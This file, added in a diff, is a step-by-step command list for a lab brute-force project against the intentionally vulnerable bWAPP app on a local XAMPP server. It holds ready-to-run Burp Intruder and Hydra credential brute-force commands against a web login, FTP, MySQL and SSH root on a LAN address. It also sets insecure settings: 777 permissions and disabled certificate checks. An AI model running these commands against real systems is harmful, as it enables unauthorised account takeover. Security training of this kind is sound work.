@@ -1,0 +1,85 @@
+FULL COMMANDS LIST FOR BRUTE-FORCE ATTACK PROJECT
+
+1. Update System & Install Required Tools
+----------------------------------------
+sudo apt update && sudo apt upgrade -y
+sudo apt install -y hydra burpsuite zip unzip
+
+2. Install XAMPP
+----------------
+wget https://www.apachefriends.org/xampp-files/5.6.40/xampp-linux-x64-5.6.40-0-installer.run
+sudo chmod +x xampp-linux-x64-5.6.40-0-installer.run
+sudo ./xampp-linux-x64-5.6.40-0-installer.run
+sudo /opt/lampp/lampp start
+sudo /opt/lampp/lampp restart
+sudo /opt/lampp/lampp stop
+
+3. Deploy bWAPP
+---------------
+wget https://sourceforge.net/projects/bwapp/files/latest/download -O bwapp.zip
+unzip bwapp.zip
+sudo mv bwapp /opt/lampp/htdocs/
+sudo chmod -R 755 /opt/lampp/htdocs/bwapp
+ls /opt/lampp/htdocs
+
+4. Database Setup
+-----------------
+sudo /opt/lampp/lampp startmysql
+http://localhost/phpmyadmin
+http://localhost/bwapp/install.php
+
+5. Fix mysql_connect Error
+--------------------------
+sudo nano /opt/lampp/etc/php.ini
+(extension=mysql.so)
+sudo /opt/lampp/lampp restart
+
+6. Burp Suite Configuration
+---------------------------
+Firefox → Settings → Network → Manual Proxy
+127.0.0.1:8080
+about:config → disable cert check
+Burp → Intercept On
+
+7. Capture Login Request
+------------------------
+http://localhost/bwapp/login.php
+POST request:
+login=test&password=12345&security_level=0&form=submit
+
+8. Burp Suite Intruder Attack
+-----------------------------
+Cluster Bomb
+Add payload markers:
+login=§test§&password=§12345§
+Load username list
+Load password list
+Start attack
+
+9. Hydra Web Form Brute-Force
+------------------------------
+hydra -L usernames.txt -P passwords.txt 127.0.0.1 http-post-form "/bwapp/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!"
+
+10. SSH Brute-Force
+-------------------
+hydra -l root -P rockyou.txt ssh://192.168.1.10
+
+11. FTP Brute-Force
+-------------------
+hydra -L users.txt -P pass.txt ftp://127.0.0.1
+
+12. MySQL Brute-Force
+---------------------
+hydra -L users.txt -P passwords.txt mysql://127.0.0.1
+
+13. Service Status Commands
+---------------------------
+sudo netstat -tulnp | grep apache
+sudo netstat -tulnp | grep mysql
+sudo netstat -tulnp | grep 8080
+
+14. Permission & Debug
+----------------------
+ls -l /opt/lampp/htdocs/bwapp
+sudo chmod -R 777 /opt/lampp/htdocs/bwapp
+sudo chown -R daemon:daemon /opt/lampp/htdocs/bwapp
